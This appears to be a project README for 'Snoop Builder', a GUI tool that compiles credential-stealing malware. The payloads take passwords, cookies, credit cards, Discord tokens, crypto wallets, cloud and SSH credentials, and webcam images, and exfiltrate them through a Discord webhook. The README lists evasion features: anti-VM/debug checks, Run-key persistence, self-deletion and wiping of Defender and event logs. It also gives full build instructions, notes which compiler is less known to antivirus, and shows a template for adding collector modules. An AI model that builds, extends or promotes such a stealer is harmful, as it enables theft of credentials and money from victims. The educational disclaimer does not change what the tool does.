```markdown
<div align="center">


<img src="VOTRE_LIEN_IMAGE_ICI" width="100%">

# 🕵️ SNOOP | Payload Builder
### *Modern PyQt5 GUI — 28 Modules · Dual Compiler · Discord Webhook*

[![Python](https://img.shields.io/badge/Python-3.10%2B-3776AB?style=for-the-badge&logo=python&logoColor=white)](https://python.org)
[![Windows](https://img.shields.io/badge/Windows-10%2F11-0078D4?style=for-the-badge&logo=windows&logoColor=white)]()
[![Linux](https://img.shields.io/badge/Linux-supported-FCC624?style=for-the-badge&logo=linux&logoColor=black)]()
[![macOS](https://img.shields.io/badge/macOS-supported-000000?style=for-the-badge&logo=apple&logoColor=white)]()
[![PyQt5](https://img.shields.io/badge/PyQt5-5.15-41CD52?style=for-the-badge&logo=qt&logoColor=white)]()
[![License](https://img.shields.io/badge/License-MIT-yellow?style=for-the-badge)]()

[![Discord](https://img.shields.io/badge/Discord-Join%20Community-7289DA?style=for-the-badge&logo=discord&logoColor=white)](https://discord.gg/VOTRE_INVITE)

---

**Snoop Builder** is a modern desktop application to configure and compile Python payloads into `.exe` or `.py` — 28 configurable modules, 5 security options, dual compiler support, and Discord webhook exfiltration.

</div>

---

## 🛠️ CORE CAPABILITIES

| Category | Modules Overview |
| :--- | :--- |
| **System** | System Info · Environment · Installed Apps · Product Key |
| **Credentials** | Passwords · Cookies · Credit Cards · Autofill · Extensions |
| **Discord & Roblox** | Tokens · Metadata · Account info (via API) |
| **Wallets** | 20 desktop wallets + 6 browser wallets |
| **Network & Remote** | WiFi · VPN · FTP · SSH · Cloud Credentials |
| **Media & Files** | Screenshot · Webcam · Telegram · Signal · Sensitive Files |

---

## 🔒 SECURITY OPTIONS

| Option | Description |
| :--- | :--- |
| **Anti-VM/Debug** | Detects VMs, sandboxes, debuggers |
| **Anti-Tamper** | Hides the console window |
| **Startup Persistence** | Adds to `HKCU\...\Run` |
| **Self-Delete** | Auto-removes after execution |
| **Wipe Logs** | Cleans Event Viewer, Defender history, WinRE |

---

## 🚀 INSTALLATION

### 🪟 Windows (Recommended)

**Automatic:**

```bat
git clone https://github.com/<user>/snoop-builder.git
cd snoop-builder
install.bat
start.bat
```

install.bat auto-installs Python (via winget if missing), pip, PyQt5, requests, psutil, Pillow, pycryptodomex, pywin32, browser-history, PyInstaller, Nuitka, and a C compiler.

Manual:

```bat
python -m pip install --upgrade pip
python -m pip install "PyQt5>=5.15.9,<6" requests
python -m pip install pyinstaller
python -m pip install nuitka ordered-set zstandard
python -m pip install requests psutil Pillow pycryptodomex pywin32 browser-history
python builder.py
```

🐧 Linux

Ubuntu / Debian:

```bash
sudo apt update
sudo apt install python3 python3-pip python3-venv git
```

Fedora:

```bash
sudo dnf install python3 python3-pip git
```

Arch:

```bash
sudo pacman -S python python-pip git
```

Setup:

```bash
git clone https://github.com/<user>/snoop-builder.git
cd snoop-builder
python3 -m venv .venv
source .venv/bin/activate
pip install "PyQt5>=5.15.9,<6" requests pyinstaller nuitka
python3 builder.py
```

Some distros need Qt system libs:

· Ubuntu/Debian: sudo apt install python3-pyqt5 libxcb-xinerama0
· Fedora: sudo dnf install python3-qt5
· Arch: sudo pacman -S python-pyqt5

🍎 macOS

```bash
/bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)"
brew install python
git clone https://github.com/<user>/snoop-builder.git
cd snoop-builder
python3 -m pip install "PyQt5>=5.15.9,<6" requests pyinstaller nuitka
python3 builder.py
```

✅ Quick Check

```bash
python -c "import PyQt5, requests, psutil, PIL, Cryptodome; print('OK')"
```

If it prints OK, you're good to go.

---

🎮 USAGE

```bash
python builder.py
```

Step Action
1. Options Paste Discord webhook · Verify · Check modules & security
2. Builder File name · Output type · Compiler · Icon · Build path
3. Build Click Start build — payload written to chosen folder

Compilers

 PyInstaller Nuitka
Speed ~30 seconds ~5 to 15 minutes
Size ~10-15 MB ~15-25 MB
AV signature Known Less known
Requires pip install pyinstaller pip install nuitka + C compiler

First Nuitka build auto-downloads MinGW (~500 MB). Subsequent builds are cached.

---

🏗️ ARCHITECTURE

Builder ↔ template communicate via placeholders replaced at build time:

Placeholder Purpose
%%WEBHOOK_URL%% Exfiltration URL
%%MODULE_FLAG_<NAME>%% Enable a module
%%SECURITY_<NAME>%% Enable a security option

A guard fails the build if any %%...%% remains unreplaced — listing the exact leftover placeholders.

Adding a Module

1. Template — write the collector:

```python
def collect_my_module(_):
    out = os.path.join(TEMP_DIR, "my_module.txt")
    with open(out, "w", encoding="utf-8") as f:
        f.write("data collected here\n")
    return out
```

2. Template — declare the flag:

```python
MODULE_FLAG_MY_MODULE = %%MODULE_FLAG_MY_MODULE%%

MODULES = [
    (MODULE_FLAG_MY_MODULE, "My Module", collect_my_module,
     "01_System", "system"),
]
```

3. Builder — add display name:

```python
MALICIOUS_MODULES = ["My Module"]
```

That's it — the checkbox appears, the placeholder is injected, the module runs.

---

⚠️ LEGAL DISCLAIMER

This software is provided for educational and authorized security research only. Unauthorized access to computer systems, networks, or accounts is illegal. The author does not condone misuse. By using this tool, you assume full responsibility for your actions and compliance with all applicable laws.

---

<div align="center">Built with 🍁 and 🖤

https://img.shields.io/github/stars/<user>/snoop-builder?style=social
https://img.shields.io/github/forks/<user>/snoop-builder?style=social

</div>
```